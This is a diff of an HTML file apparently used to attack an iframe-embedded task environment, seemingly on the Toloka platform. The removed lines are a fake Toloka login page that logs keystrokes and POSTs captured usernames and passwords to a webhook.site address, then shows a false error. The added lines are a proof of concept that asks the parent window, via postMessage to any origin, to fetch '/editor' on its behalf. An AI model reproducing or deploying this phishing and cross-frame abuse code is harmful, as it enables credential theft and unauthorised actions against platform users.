@@ -1,39 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Keylogger iframe</title>
-  <style>
-    * { font-family: sans-serif; }
-    #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 10px; height: 300px; overflow: auto; }
-  </style>
-</head>
+<head><meta charset="utf-8"><title>RPC test</title></head>
 <body>
-  <h3 style="color:red">🚨 Fake Toloka Login</h3>
-  <input placeholder="Username" id="user"><br><br>
-  <input placeholder="Password" type="password" id="pass"><br><br>
-  <button onclick="submit()">Login</button>
-  <div id="log"></div>
-
+<h3>RPC PoC inside iframe</h3>
+<pre id="log"></pre>
 <script>
-const log = (msg) => {
-  document.getElementById('log').textContent += msg + '\n';
-};
+const log = m => { console.log(m); document.getElementById('log').textContent += m + '\n'; };
 
-document.addEventListener('keydown', e => {
-  log("Pressed: " + e.key);
-});
+log('iframe origin: ' + location.origin);
+log('parent comparison: ' + (window === window.parent));   // يجب أن يكون false
 
-// simulate phishing
-function submit() {
-  const u = document.getElementById('user').value;
-  const p = document.getElementById('pass').value;
-  fetch('https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ user: u, pass: p })
-  });
-  alert("Invalid credentials"); // fake error
-}
+const id = crypto.randomUUID();
+window.addEventListener('message', e => log('[recv] ' + JSON.stringify(e.data)));
+
+window.parent.postMessage({
+  type: 'rpc',
+  id,
+  name: 'fetch',
+  payload: { url: '/editor', requestInit: { method: 'GET' } }
+}, '*');
+
+log('[sent] id=' + id);
 </script>
 </body>
 </html>
